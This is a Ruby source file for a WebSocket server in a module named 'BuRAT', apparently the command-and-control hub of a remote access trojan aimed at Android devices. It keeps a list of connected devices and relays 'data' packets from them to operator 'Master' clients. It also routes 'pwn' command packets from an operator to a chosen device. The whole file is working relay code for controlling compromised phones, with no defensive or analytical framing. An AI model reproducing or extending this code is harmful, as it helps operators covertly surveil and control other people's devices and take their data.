require 'faye/websocket'
require 'json'

module BuRAT
  class WebSocketServer
    KEEPALIVE_TIME = 15 # in seconds

    def initialize(app)
      @app     = app
      @androids = []
    end

    def call(env)
      if Faye::WebSocket.websocket?(env)
        ws = Faye::WebSocket.new(env, nil, {ping: KEEPALIVE_TIME })

        # OPEN
        ws.on :open do |event|

        end

        # MESSAGE
        ws.on :message do |event|
          begin
            packet = JSON.parse(event.data) # parse packet

            header = packet['header']       # header
            payload = packet['payload']     # payload
            trailer = packet['trailer']     # trailer

            p header
            #p trailer                       # debug

            if header == "androids" then     # clients - list of clients
              packet = packet("androids", @androids, 'deathnote')
              ws.send(packet)
            elsif header == "android" then   # client - client identification
              android = @androids.find { |android| android["id"] == payload["id"] }
              payload.store("status", "Online")
              payload.store("ws", ws)
              android == nil ? @androids << payload : android.replace(payload)
              packet = packet("android", payload, "disconnected")
              masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
              masters.each { |master| master["ws"].send(packet) }
            elsif header == "data" then     # data - send to master and pipe
              packet = packet("data", payload, trailer)
              masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
              masters.each { |master| master["ws"].send(packet) }
            elsif header == "pwn" then      # pwn - send to other clients
              packet = packet("pwn", payload, trailer)
              android = @androids.find { |android| android["id"] == payload["android"]}
              android["ws"].send(packet)
            elsif header == "pipe_open" then
            elsif header == "pipe_close" then
            end
          rescue
            #ws.send(event.data)
            #some server stuff here if error is packet is not json
          end
        end

        # CLOSE
        ws.on :close do |event|
          android = @androids.find { |android| android["ws"] == ws }
          android["status"] = "Offline"
          android["ws"] = nil
          packet = packet('android', android, "disconnected")
          masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
          masters.each { |master| master["ws"].send(packet) }
        end

        # Return async Rack response
        ws.rack_response

      else
        @app.call(env)
      end
    end

    private
    def packet(header, payload, trailer)
      {'header' => header, 'payload' => payload, 'trailer' => trailer}.to_json
    end

  end
end
